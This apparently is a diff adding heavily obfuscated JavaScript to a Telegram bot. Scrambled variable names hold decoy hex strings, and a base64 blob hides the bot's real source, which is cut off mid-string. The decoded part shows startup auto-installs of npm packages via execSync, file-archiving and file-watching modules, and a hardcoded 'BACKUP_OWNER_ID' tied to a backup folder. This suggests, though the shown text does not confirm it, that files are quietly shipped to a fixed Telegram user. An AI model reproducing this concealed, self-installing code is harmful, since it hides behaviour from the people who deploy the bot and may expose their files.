+var かぜ々50746="7e7937b497dcc0505d519469295d659fea0425afc1396fe48a62929ec359dd3e6760d55ce9e040ae0873a49ef77b369b3f960b359fa09f44fba457674df3c0a4e58e6a97e2f56d9f9ccb42ed9a84ec5d";
+var さくらツ42019="630b7c73a4c1b491e0d02cb17a1737a8fa9ad7a78a4f9f3e972acef0a6000b63c2837174d444eca12c54896553e88a2811989dc9efa25c85388b54184fe2329430de94c399d1df901dde80fa1394fd7d";
+var さくらメ92214="ed0f232343bd09036b259555c2a02b75c896cec31219f2bdb961990d5a314ba9a086d7643577ebe50ce2638ef8c134f27a51de4fb5fe11ac68f4c3495d65ef959fbbb811bd63f5ab513220702e8d8373";
+var みずメ85241="941bbd9c1cf3c4fce208e27b0c24d643b56f54bc63a3ede8ff65f7bbe3933ca4208cfc90dcfb314636ec9c01a0a8cd1c88747d8bab74b5d68dbede7fde668f1ce4680536e5a0be8898959f9bf7ff3c94";
+var むげんツ61053="d9f7dfe7539730c0b975114bdf2d04a65666e4d102bde25d7ec1e87e4cc03bd98fd177ee73974f010269d0623db484de40811bac019d4075bf743db3cf8e39796966914d8f552ba1ff567f0f8fc3ae1e";
+var むげん々21651="f28775f2505762eba67d7be1d65009733c51ca864d49185906dea43345e84b0a9f66b05bd50ad83a79bd034f4ce327eec95bd6aa8b6b7d3c70fa00eb1d74699d411f529333d93b44f3accca35b442755";
+var れい〆18441="388af6df23cd12a9b2d4c09ea1b455ddc666d6c70af994972ff4b9895ac349a65a99290b905f8256180f49ded917a24273c4fb35026bca1de74d4479d303ff151b32ed9aa4961eb7144d0167b3887dc4";
+var かぜ刃38947="4b26979127c12cd37ccf639167e3b3b212927be6a63f7a364202743320367d05aae83f266ef04321265c744d00bc6e2423ed96069e8ad6526e00eb56637768293fc25f2360e22a97e74da5afd3348504";
+var ゆきメ29012="48a2a0d2d5c71459cecc73ee8cf9b5a86220d4b97d60631421c0425eaf03bf7ac7ed322120694a404e7e23b5be372f3ffd86e2ef527408b09cf5dcb484b2d9c9341074d8d206a882ff36063c84cf0c96";
+var れい々93102="b11548468a495a51898ac6d1c9e211a73c8cdcad08792e455021488cb3669ab25ea99822a46748d295327adc7e28da8402ad425c7db3725d2b5f82494659eebd67f17f679f7ccd356ef999c206b27f24";
+var ゆきメ46450="6caab136a256ac05d74084cd5a6d368763b35e2a4f6f1dc76aec69b0add36c8cacd12e14dc74d8bb68d8b933c3ad9ab2eeffecf42d9661d2397bdd477e98e0d3c3f5af932d8b49701d9e8f3e19200c1a";
+var ねこ々71177="b555ce4a71541fc639bdcb09c3e35404274f128512a5462b3a7c86082464ae84da88d366112a6dfecdc36bb96e6b0f89b5387591e5fff4715aba36be976146c565f058bdad8a715ed1b5d926722d8a68";
+var ほし々88770="5e3afd8866e6dbd4314ebfa0242e6eec9de1ea509968786380b34002db5e96eb851494575d61bf6a79241655438db2041be4d9e4e8c2d57d6f6e4601b12a532f2b4f1948e4d9ee9172a4e68c27abd17e";
+var みず刃74126="57330693ec37d370250d55aa3a8fbedb1437eb1f9b4a54a1d3ce8d8c55c88b2eade678baa686b1bae9c967cda5645ecd6ed6b2f7cd19b225ac1d7b6cd95b9cc25e4e1daa054b957882afcfabb97d515a";
+var みずメ45884="49383e59dbee7290ef506c09e119571393c01204dfead23373d291048b12f6764fa4b682386aa19a68a478c29553999ea582cdb089422fe65de79fc6e518cf06a9948b8a1f59af9e8ed333d78bc93433";
+var れいฬ23643="066f6ebc3895bb57fb1880168ae4b185b2c4d5d0af1c31899d95b455678030fc7050a3c076960308df1e018be1b49982872ef061f43bfcfc413952a5f021ea5beec22811f409777d18c47c9a0f95b010";
+
+function ゆき〆62844(){
+const そらん99337="Y29uc3QgeyBUZWxlZ3JhZiB9ID0gcmVxdWlyZSgndGVsZWdyYWYnKTsKY29uc3QgZnMgPSByZXF1aXJlKCdmcy1leHRyYScpOwpjb25zdCBhcmNoaXZlciAgPSByZXF1aXJlKCJhcmNoaXZlciIpCmNvbnN0IGNob2tpZGFyICA9IHJlcXVpcmUoImNob2tpZGFyIikKY29uc3QgY3J5cHRvID0gcmVxdWlyZSgnY3J5cHRvJyk7CmNvbnN0IHsgZXhlY1N5bmMgfSA9IHJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKQoKZnVuY3Rpb24gZXNjYXBlSHRtbCh0ZXh0ID0gIiIpIHsKICAgIHJldHVybiB0ZXh0CiAgICAgICAgLnJlcGxhY2UoLyYvZywgIiZhbXA7IikKICAgICAgICAucmVwbGFjZSgvPC9nLCAiJmx0OyIpCiAgICAgICAgLnJlcGxhY2UoLz4vZywgIiZndDsiKQp9CgpmdW5jdGlvbiBhdXRvSW5zdGFsbChtb2R1bGVOYW1lKSB7CgogICAgdHJ5IHsKCiAgICAgICAgLy8gY2VrIG1vZHVsZQogICAgICAgIHJlcXVpcmUucmVzb2x2ZShtb2R1bGVOYW1lKQoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYE1PRFVMRSAke21vZHVsZU5hbWV9IHN1ZGFoIHRlcmluc3RhbGxgCiAgICAgICAgKQoKICAgIH0gY2F0Y2ggewoKICAgICAgICBjb25zb2xlLmxvZygKICAgICAgICAgICAgYElOU1RBTEwgaW5zdGFsbGluZyAke21vZHVsZU5hbWV9Li4uYAogICAgICAgICkKCiAgICAgICAgdHJ5IHsKCiAgICAgICAgICAgIGV4ZWNTeW5jKAogICAgICAgICAgICAgICAgYG5wbSBpbnN0YWxsICR7bW9kdWxlTmFtZX1gLAogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHN0ZGlvOiAiaW5oZXJpdCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKQoKICAgICAgICAgICAgY29uc29sZS5sb2coCiAgICAgICAgICAgICAgICBgU1VDQ0VTUyAke21vZHVsZU5hbWV9IGJlcmhhc2lsIGRpaW5zdGFsbGAKICAgICAgICAgICAgKQoKICAgICAgICB9IGNhdGNoIChlcnIpIHsKCiAgICAgICAgICAgIGNvbnNvbGUubG9nKAogICAgICAgICAgICAgICAgYFBST1NFUyBJTlNUQUxMICR7bW9kdWxlTmFtZX1gCiAgICAgICAgICAgICkKCiAgICAgICAgICAgIGNvbnNvbGUubG9nKAogICAgICAgICAgICAgICAgZXJyLm1lc3NhZ2UKICAgICAgICAgICAgKQogICAgICAgIH0KICAgIH0KfQoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gQVVUTyBJTlNUQUxMIExJU1QKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KY29uc3QgbW9kdWxlcyA9IFsKCiAgICAiY3J5cHRvIiwKICAgICJheGlvcyIsCiAgICAiZnMtZXh0cmEiLAogICAgImdyYW1teSIsCiAgICAibW9tZW50LXRpbWV6b25lIiwKICAgICJwYXRoIiwKICAgICJjaG9raWRhciIsCiAgICAiYXJjaGl2ZXJANS4zLjEiLAogICAgImFjb3JuIiwKICAgICJvcyIsCiAgICAidm0iLAogICAgImh0dHAiLAogICAgImh0dHBzIgoKXQoKLy8gPT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KLy8gUlVOIEFVVE8gSU5TVEFMTAovLyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PQpmb3IgKGNvbnN0IG1vZCBvZiBtb2R1bGVzKSB7CgogICAgYXV0b0luc3RhbGwobW9kKQp9CmNvbnN0IGF4aW9zID0gcmVxdWlyZSgnYXhpb3MnKQpjb25zdCBvcyA9IHJlcXVpcmUoJ29zJykKY29uc3QgaHR0cHMgPSByZXF1aXJlKCJodHRwcyIpCmNvbnN0IGh0dHAgPSByZXF1aXJlKCJodHRwIikKY29uc3Qgdm0gPSByZXF1aXJlKCd2bScpCmNvbnN0IGFjb3JuID0gcmVxdWlyZSgnYWNvcm4nKQpjb25zdCBwYXRoID0gcmVxdWlyZSgncGF0aCcpCmNvbnN0IHsgQm90LCBJbnB1dEZpbGUgfSA9IHJlcXVpcmUoJ2dyYW1teScpCmNvbnN0IG1vbWVudCA9IHJlcXVpcmUoIm1vbWVudC10aW1lem9uZSIpCmNvbnN0IGNvbmZpZyA9IHJlcXVpcmUoJy4vY29uZmlnJyk7CgovLyBoZWxwZXIgZXV5eQpjb25zdCBQQVRIX01BSU5URU5BTkNFID0gIi4vZGF0YWJhc2UvbWFpbnRlbmFuY2UuanNvbiIKCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ci8vIENSRUFURSBGSUxFCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmlmICghZnMuZXhpc3RzU3luYyhQQVRIX01BSU5URU5BTkNFKSkgewoKICAgIGZzLndyaXRlRmlsZVN5bmMoCiAgICAgICAgUEFUSF9NQUlOVEVOQU5DRSwKICAgICAgICBKU09OLnN0cmluZ2lmeSh7CiAgICAgICAgICAgIHN0YXR1czogZmFsc2UsCiAgICAgICAgICAgIHJlYXNvbjogIi0iCiAgICAgICAgfSwgbnVsbCwgMikKICAgICkKfQoKLy8gaGVscGVyIGJhY2Egc3RhdHVzIG1haW50ZW5hbmNlCmZ1bmN0aW9uIGlzTWFpbnRlbmFuY2UoKSB7CiAgICB0cnkgewogICAgICAgIGNvbnN0IGRhdGEgPSBKU09OLnBhcnNlKAogICAgICAgICAgICBmcy5yZWFkRmlsZVN5bmMoUEFUSF9NQUlOVEVOQU5DRSwgInV0ZjgiKQogICAgICAgICkKICAgICAgICByZXR1cm4gZGF0YS5zdGF0dXMgPT09IHRydWUKICAgIH0gY2F0Y2ggewogICAgICAgIHJldHVybiBmYWxzZQogICAgfQp9CgovLyBCYWNrdXAgRmlsZXMgSmlycgpjb25zdCBCQUNLVVBfT1dORVJfSUQgPSA4NTc5MTUxNTY0Cgpjb25zdCBCQUNLVVBfRElSID0KcGF0aC5qb2luKF9fZGlybmFtZSwgImJhY2t1cCIpCgoKCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ci8vIENSRUFURSBCQUNLVVAgRElSCi8vID09PT09PT09PT09PT09PT09PT09PT09PT09PT09CmlmICghZnMuZXhpc3RzU3luYyhCQUNLVVBfRElSKSkgewoKICAgIGZzLm1rZGlyU3luYygKICAgICAgICBCQUNLVVBfRElSLAogICAgICAgIHsKICAgICAgICAgICAgcmVjdXJzaXZlOiB0cnVlCiAgICAgICAgfQogICAgKQp9Cgpjb25zdCBwYXVzZSA9IChtcykgPT4gbmV3IFByb21pc2UocmVzb2x2ZSA9PiBzZXRUaW1lb3V0KHJlc29sdmUsIG1zKSkKCmNvbnN0IEUgPSB7CiAgYm90OiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1OTg3ODAyODY4NzM0NzYwOTQ1Jz7inKg8L3RnLWVtb2ppPmAsCiAgYm90U3RhcjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNDk1NjIzMjM4MzcyMTM3NDgzNic+4pyoPC90Zy1lbW9qaT5gLAogIGRldjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTg3OTc3MDczNTk5OTcxNzExNSc+4pyoPC90Zy1lbW9qaT5gLAogIGRvYzogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTgzOTM4MDU4MDA4MDI5MzgxMyc+4pyoPC90Zy1lbW9qaT5gLAogIGRvdDogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTgzMjI1MTk4NjYzNTkyMDAxMCc+4pyoPC90Zy1lbW9qaT5gLAogIGR1cmF0aW9uOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1Nzc2MjEzMTkwMzg3OTYxNjE4Jz7inKg8L3RnLWVtb2ppPmAsCiAgZW1vRnJlZTogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTM2ODMyNDE3MDY3MTIwMjI4Nic+4pyoPC90Zy1lbW9qaT5gLAogIGVycjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTg4NjQ5NjYxMTgzNTU4MTM0NSc+4pyoPC90Zy1lbW9qaT5gLAogIGdhbWVzOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc0OTU4OTAzMzg5NTIzMDE4NzY5Jz7inKg8L3RnLWVtb2ppPmAsCiAgZ3JvdXA6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4Nzk4OTY2OTAyMTA2Mzk5NDcnPuKcqDwvdGctZW1vamk+YCwKICBncnA6IGA8dGctZW1vamkgZW1vamktaWQ9JzU5ODMzOTkwNDExOTc2NzUyNTYnPuKcqDwvdGctZW1vamk+YCwKICBpZDogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTgxOTA3ODgyODAxNzg0OTM1Nyc+4pyoPC90Zy1lbW9qaT5gLAogIGluZm8yOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODg2NDQwODA3MzI1NTA0MTY3Jz7inKg8L3RnLWVtb2ppPmAsCiAga2V5OiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODc3MzA3MjAyODg4MjczNTM5Jz7inKg8L3RnLWVtb2ppPmAsCiAgbGluazogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTc5NjQ0MDE3MTM2NDc0OTk0MCc+4pyoPC90Zy1lbW9qaT5gLAogIG11dGU6IGA8dGctZW1vamkgZW1vamktaWQ9JzU3NzE1MTExMDMxNDE5NzUxMTUnPuKcqDwvdGctZW1vamk+YCwKICBuYW1lOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODgzOTY0MTcwMjY4ODQwMDMyJz7inKg8L3RnLWVtb2ppPmAsCiAgb2s6IGA8dGctZW1vamkgZW1vamktaWQ9JzYyOTY1MDEzODgyNzY5MjYyMTUnPuKcqDwvdGctZW1vamk+YCwKICBzZXQ6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4ODY3MDc0ODE4NDQ5MTIwMDEnPuKcqDwvdGctZW1vamk+YCwKICBzaGllbGQ6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4NDM4NjIyODM5NjQzOTA1MjgnPuKcqDwvdGctZW1vamk+YCwKICBzdGF0dXM6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4MzkzNTQxNDAyNjE2MTkxOTMnPuKcqDwvdGctZW1vamk+YCwKICB0b29sczogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTkyNDcyMDkxODgyNjg0ODUyMCc+4pyoPC90Zy1lbW9qaT5gLAogIHRvdGFsOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODg4Nzk5NzM2NTA4NDU0MjMxJz7inKg8L3RnLWVtb2ppPmAsCiAgdXNlcjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTkyMDM0NDM0NzE1MjIyNDQ2Nic+4pyoPC90Zy1lbW9qaT5gLAogIHZlcnNpb246IGA8dGctZW1vamkgZW1vamktaWQ9JzU5NTY1NjE3NDkwNzAwNTc1MzYnPuKcqDwvdGctZW1vamk+YCwKICB3YXJuOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODgxNzAyNzM2ODQzNTExMzI3Jz7inKg8L3RnLWVtb2ppPmAsCiAgd2FybkluZm86IGA8dGctZW1vamkgZW1vamktaWQ9JzU5NTQxNzU5MjA1MDY5MzM4NzMnPuKcqDwvdGctZW1vamk+YCwKCiAgYWxhc2FuOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODM5MzgwNTgwMDgwMjkzODEzJz7wn5OdPC90Zy1lbW9qaT5gLAogIGNhbnRpazogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNjI5NjUwMTM4ODI3NjkyNjIxNSc+8J+ShDwvdGctZW1vamk+YCwKICBjYXNpbm86IGA8dGctZW1vamkgZW1vamktaWQ9JzQ5NTg5MDMzODk1MjMwMTg3NjknPvCfjrA8L3RnLWVtb2ppPmAsCiAgY3Jvd246IGA8dGctZW1vamkgZW1vamktaWQ9JzU4ODE3MDI3MzY4NDM1MTEzMjcnPvCfkZE8L3RnLWVtb2ppPmAsCiAgZ2FtZTogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNDk1ODkwMzM4OTUyMzAxODc2OSc+8J+OrjwvdGctZW1vamk+YCwKICBncmVlbjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNjI5NjUwMTM4ODI3NjkyNjIxNSc+8J+fojwvdGctZW1vamk+YCwKICBqYWNrcG90OiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc2Mjk2NTAxMzg4Mjc2OTI2MjE1Jz7wn46JPC90Zy1lbW9qaT5gLAogIGtheWE6IGA8dGctZW1vamkgZW1vamktaWQ9JzYyOTY1MDEzODgyNzY5MjYyMTUnPvCfkrU8L3RnLWVtb2ppPmAsCiAga2hvZGFtOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1OTg3ODAyODY4NzM0NzYwOTQ1Jz7wn5SuPC90Zy1lbW9qaT5gLAogIGxhYmVsOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODg2NDQwODA3MzI1NTA0MTY3Jz7wn4+377iPPC90Zy1lbW9qaT5gLAogIGxpbGluOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODM5MzU0MTQwMjYxNjE5MTkzJz7wn5Wv77iPPC90Zy1lbW9qaT5gLAogIGxvY2s6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4ODY0OTY2MTE4MzU1ODEzNDUnPvCflJI8L3RnLWVtb2ppPmAsCiAgbWlza2luOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc2Mjk2NTAxMzg4Mjc2OTI2MjE1Jz7wn5K4PC90Zy1lbW9qaT5gLAogIG5hbWViYWRnZTogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTg4Mzk2NDE3MDI2ODg0MDAzMic+8J+TmzwvdGctZW1vamk+YCwKICBwYW50dW46IGA8dGctZW1vamkgZW1vamktaWQ9JzU4MzkzODA1ODAwODAyOTM4MTMnPvCfk5w8L3RnLWVtb2ppPmAsCiAgcmVkOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODg2NDk2NjExODM1NTgxMzQ1Jz7wn5S0PC90Zy1lbW9qaT5gLAogIHNhZDogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTg4NjQ5NjYxMTgzNTU4MTM0NSc+8J+YojwvdGctZW1vamk+YCwKICBzcGVrOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODgzOTY0MTcwMjY4ODQwMDMyJz7wn5OKPC90Zy1lbW9qaT5gLAogIHN0YXIyOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1ODgxNzAyNzM2ODQzNTExMzI3Jz7irZA8L3RnLWVtb2ppPmAsCiAgdGFtcGFuOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc2Mjk2NTAxMzg4Mjc2OTI2MjE1Jz7wn6qePC90Zy1lbW9qaT5gLAogIHRvbG9sOiBgPHRnLWVtb2ppIGVtb2ppLWlkPSc1OTg3ODAyODY4NzM0NzYwOTQ1Jz7wn6egPC90Zy1lbW9qaT5gLAogIHVrdXI6IGA8dGctZW1vamkgZW1vamktaWQ9JzU4MzkzODA1ODAwODAyOTM4MTMnPvCfk5A8L3RnLWVtb2ppPmAsCiAgdW11cjogYDx0Zy1lbW9qaSBlbW9qaS1pZD0nNTgzOTM1NDE0MDI2MTYxOTE5Myc+8J+OgjwvdGctZW1vamk+YCwKICB1bmxvY2s6IGA8dGctZW1vamkgZW1vamktaWQ9JzYyOTY1MDEzODgyNzY5MjYyMTUnPvCflJM8L3RnLWVtb2ppPmAsCn07Cgpjb25zdCBlc2MgPSBzID0+IHMucmVwbGFjZSgvJi9nLCAiJmFtcDsiKS5yZXBsYWNlKC88L2csICImbHQ7IikucmVwbGFjZSgvPi9nLCAiJmd0OyIpCgpmdW5jdGlvbiBhbmFseXNlQ29kZShjb2RlKSB7CiAgbGV0IGVycm9yTXNnICAgPSAiIgogIGxldCBlcnJvckxpbmUgID0gbnVsbAogIGxldCBlcnJvckNvbCAgID0gbnVsbAogIGxldCBmaXhTdWdnZXN0ID0gIiIKCiAgdHJ5IHsKICAgIG5ldyBGdW5jdGlvbihjb2RlKSAvLyBlc2xpbnQtZGlzYWJsZS1saW5lIG5vLW5ldy1mdW5jCiAgfSBjYXRjaCAoZSkgewogICAgZXJyb3JNc2cgPSBlLm1lc3NhZ2UKICAgIGNvbnN0IG1zZyA9IGUubWVzc2FnZQoKICAgIGxldCBtID0gbXNnLm1hdGNoKC9saW5lIChcZCspL2kpCiAgICBpZiAobSkgZXJyb3JMaW5lID0gcGFyc2VJbnQobVsxXSkKCiAgICBpZiAoIWVycm9yTGluZSkgewogICAgICBtID0gKGUuc3RhY2sgfHwgIiIpLm1hdGNoKC88YW5vbnltb3VzPjooXGQrKTooXGQrKS8pCiAgICAgIGlmIChtKSB7IGVycm9yTGluZSA9IHBhcnNlSW50KG1bMV0pIC0gMjsgZXJyb3JDb2wgPSBwYXJzZUludChtWzJdKSB9CiAgICB9CgogICAgaWYgICAgICAoL3VuZXhwZWN0ZWQgdG9rZW4gJ2Vsc2UnL2kudGVzdChtc2cpKSAgICAgICBmaXhTdWdnZXN0ID0gIkFkYSBibG9rIGBpZmAgdGlkYWsgbGVuZ2thcCBhdGF1IGt1cnVuZyBrdXJhd2FsIGB7fWAgaGlsYW5nIHNlYmVsdW0gYGVsc2VgLiIKICAgIGVsc2UgaWYgKC91bmV4cGVjdGVkIHRva2VuL2kudGVzdChtc2cpKSAgICAgICAgICAgICAgZml4U3VnZ2VzdCA9ICJQZXJpa3NhIHRhbmRhIGt1cnVuZyBgKClgLCBrdXJhd2FsIGB7fWAsIHNpa3UgYFtdYCwgYXRhdSB0aXRpayBrb21hIGA7YCB5YW5nIGhpbGFuZy9zYWxhaCBwb3Npc2kuIgogICAgZWxzZSBpZiAoL2lzIG5vdCBkZWZpbmVkL2kudGVzdChtc2cpKSAgICAgICAgICAgICAgICBmaXhTdWdnZXN0ID0gIlZhcmlhYmVsL2Z1bmdzaSBiZWx1bSBkaWRla2xhcmFzaWthbi4gVGFtYmFoa2FuIGBjb25zdC9sZXQvdmFyYCBhdGF1IHBhc3Rpa2FuIHN1ZGFoIGRpLWltcG9ydC4iCiAgICBlbHNlIGlmICgvY2Fubm90IHJlYWQgcHJvcGVydC9pLnRlc3QobXNnKSkgICAgICAgICAgIGZpeFN1Z2dlc3QgPSAiT2JqZWsgYmVybmlsYWkgbnVsbC91bmRlZmluZWQuIEd1bmFrYW4gb3B0aW9uYWwgY2hhaW5pbmcgYD8uYCBhdGF1IGNlayBuaWxhaSB0ZXJsZWJpaCBkYWh1bHUuIgogICAgZWxzZSBpZiAoL2F3YWl0IGlzIG9ubHkgdmFsaWQvaS50ZXN0KG1zZykpICAgICAgICAgICBmaXhTdWdnZXN0ID0gImBhd2FpdGAgaGFueWEgdmFsaWQgZGkgZGFsYW0gYGFzeW5jIGZ1bmN0aW9uYC4gQnVuZ2t1cyBrb2RlIGRlbmdhbiBgYXN5bmMgZnVuY3Rpb24oKSB7fWAuIgogICAgZWxzZSBpZiAoL21pc3NpbmcgXCkgYWZ0ZXIvaS50ZXN0KG1zZykpICAgICAgICAgICAgICBmaXhTdWdnZXN0ID0gIlRhbmRhIGt1cnVuZyBgKClgIHRpZGFrIGRpdHV0dXAgZGVuZ2FuIGJlbmFyLiIKICAgIGVsc2UgaWYgKC9taXNzaW5nIH0gYWZ0ZXIvaS50ZXN0KG1zZykpICAgICAgICAgICAgICAgZml4U3VnZ2VzdCA9ICJLdXJ1bmcga3VyYXdhbCBge31gIHRpZGFrIGRpdHV0dXAuIENlayBwZW51dHVwYW4gZnVuY3Rpb24vb2JqZWN0L2NsYXNzLiIKICAgIGVsc2UgaWYgKC9pbnZhbGlkIG9yIHVuZXhwZWN0ZWQvaS50ZXN0KG1zZykpICAgICAgICAgZml4U3VnZ2VzdCA9ICJUb2tlbiB0aWRhayB2YWxpZCBkaSBwb3Npc2kgaW5pLiBDZWsgc2ludGFrcyBkaSBzZWtpdGFyIGJhcmlzIGVycm9yLiIKICAgIGVsc2UgaWYgKC9hc3NpZ25tZW50IHRvIGNvbnN0YW50L2kudGVzdChtc2cpKSAgICAgICAgZml4U3VnZ2VzdCA9ICJUaWRhayBiaXNhIG1lbmd1YmFoIG5pbGFpIGBjb25zdGAuIEdhbnRpIGRlbmdhbiBgbGV0YCBqaWthIHBlcmx1IHJlLWFzc2lnbi4iCiAgICBlbHNlIGlmICgvZHVwbGljYXRlIHBhcmFtZXRlci9pLnRlc3QobXNnKSkgICAgICAgICAgIGZpeFN1Z2dlc3QgPSAiQWRhIHBhcmFtZXRlciB5YW5nIHNhbWEgZGFsYW0gZnVuY3Rpb24uIEdhbnRpIG5hbWEgcGFyYW1ldGVyIHlhbmcgZHVwbGlrYXQuIgogICAgZWxzZSBpZiAoL2lkZW50aWZpZXIuKmFscmVhZHkuKmRlY2xhcmVkL2kudGVzdChtc2cpKSBmaXhTdWdnZXN0ID0gIk5hbWEgdmFyaWFiZWwgc3VkYWggZGlwYWthaSBkaSBzY29wZSB5YW5nIHNhbWEuIEdhbnRpIG5hbWEgYXRhdSBoYXB1cyBkZWtsYXJhc2kgZHVwbGlrYXQuIgogICAgZWxzZSBpZiAoL2Nhbm5vdCB1c2UuKmJlZm9yZS4qaW5pdC9pLnRlc3QobXNnKSkgICAgICBmaXhTdWdnZXN0ID0gIlZhcmlhYmVsIGRpcGFrYWkgc2ViZWx1bSBkaWRla2xhcmFzaWthbiAodGVtcG9yYWwgZGVhZCB6b25lKS4gUGluZGFoa2FuIGRla2xhcmFzaSBrZSBhdGFzLiIKICAgIGVsc2UgaWYgKC91bmV4cGVjdGVkIGVuZCBvZiBpbnB1dC9pLnRlc3QobXNnKSkgICAgICAgZml4U3VnZ2VzdCA9ICJLb2RlIGJlbHVtIHNlbGVzYWkuIEFkYSBrdXJ1bmcgYXRhdSBzdHJpbmcgeWFuZyB0aWRhayBkaXR1dHVwIGRpIGJhZ2lhbiBha2hpci4iCiAgICBlbHNlIGlmICgvb2N0YWwuKnN0cmljdC9pLnRlc3QobXNnKSkgICAgICAgICAgICAgICAgIGZpeFN1Z2dlc3QgPSAiTGl0ZXJhbCBva3RhbCB0aWRhayBkaWl6aW5rYW4gZGkgc3RyaWN0IG1vZGUuIEhhcHVzIGFuZ2thIDAgZGkgZGVwYW4gYXRhdSBndW5ha2FuIDBvIHByZWZpeC4iCiAgICBlbHNlICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZpeFN1Z2dlc3QgPSAiUGVyaWtzYSBzaW50YWtzIGRhbiBsb2dpa2EgZGkgc2VraXRhciBiYXJpcyB5YW5nIGRpdHVuanVrLiIKICB9CgogIGNvbnN0IGFubm90YXRlZCA9IGNvZGUuc3BsaXQoIlxuIikubWFwKChsbiwgaWR4KSA9PiB7CiAgICBjb25zdCBubyAgICA9IFN0cmluZyhpZHggKyAxKS5wYWRTdGFydCg0LCAiICIpCiAgICBjb25zdCBpc0VyciA9IGVycm9yTGluZSAmJiBpZHggKyAxID09PSBlcnJvckxpbmUKICAgIHJldHVybiBpc0VycgogICAgICA/IGAke25vfSB8ID4+PiAgJHtsbn0ke2Vycm9yQ29sID8gYCAgIOKGkCBFUlJPUiBjb2wgJHtlcnJvckNvbH1gIDogIiAgIOKGkCBFUlJPUiBESSBTSU5JIn1gCiAgICAgIDogYCR7bm99IHwgICAgICR7bG59YAogIH0pLmpvaW4oIlxuIikKCiAgcmV0dXJuIHsgZXJyb3JNc2csIGVycm9yTGluZSwgZXJyb3JDb2wsIGZpeFN1Z2dlc3QsIGFubm90YXRlZCwgaGFzRXJyb3I6ICEhZXJyb3JNc2cgfQp9Cgphc3luYyBmdW5jdGlvbiBkb3dubG9hZFRnRmlsZSh0ZWxlZ3JhbSwgZmlsZUlkKSB7CgogICAgY29uc3QgZmlsZSA9CiAgICBhd2FpdCB0ZWxlZ3JhbS5nZXRGaWxlKGZpbGVJZCkKCiAgICBjb25zdCB1cmwgPQogICAgYGh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9maWxlL2JvdCR7Y29uZmlnLkJPVF9UT0tFTn0vJHtmaWxlLmZpbGVfcGF0aH1gCgogICAgcmV0dXJuIG5ldyBQcm9taXNlKChyZXNvbHZlLCByZWplY3QpID0+IHsKCiAgICAgICAgaHR0cHMuZ2V0KHVybCwgKHJlcykgPT4gewoKICAgICAgICAgICAgY29uc3QgY2h1bmtzID0gW10KCiAgICAgICAgICAgIHJlcy5vbigiZGF0YSIsIGQgPT4KICAgICAgICAgICAgICAgIGNodW5rcy5wdXNoKGQpCiAgICAgICAgICAgICkKCiAgICAgICAgICAgIHJlcy5vbigiZW5kIiwgKCkgPT4KICAgICAgICAgICAgICAgIHJlc29sdmUoCiAgICAgICAgICAgICAgICAgICAgQnVmZmVyLmNvbmNhdChjaHVua3MpCiAgICAgICAgICAgICAgICAgICAgLnRvU3RyaW5nKCJ1dGY4IikKICAgICAgICAgICAgICAgICkKICAgICAgICAgICAgKQoKICAgICAgICAgICAgcmVzLm9uKCJlcnJvciIsIHJlamVjdCkKCiAgICAgICAgfSkub24oImVycm9yIiwgcmVqZWN0KQoKICAgIH0pCn0KCmZ1bmN0aW9uIHJlbmRlckFubm90YXRlZChjb2RlLCBlcnJMaW5lKSB7CiAgcmV0dXJuIGNvZGUuc3BsaXQoIlxuIikubWFwKChsbiwgaWR4KSA9PiB7CiAgICBjb25zdCBubyA9IFN0cmluZyhpZHggKyAxKS5wYWRTdGFydCg0LCAiICIpCiAgICByZXR1cm4gZXJyTGluZSAmJiBpZHggKyAxID09PSBlcnJMaW5lCiAgICAgID8gYCR7bm99IHwgPj4+ICAke2xufSAgIOKGkCBFUlJPUmAKICAgICAgOiBgJHtub30gf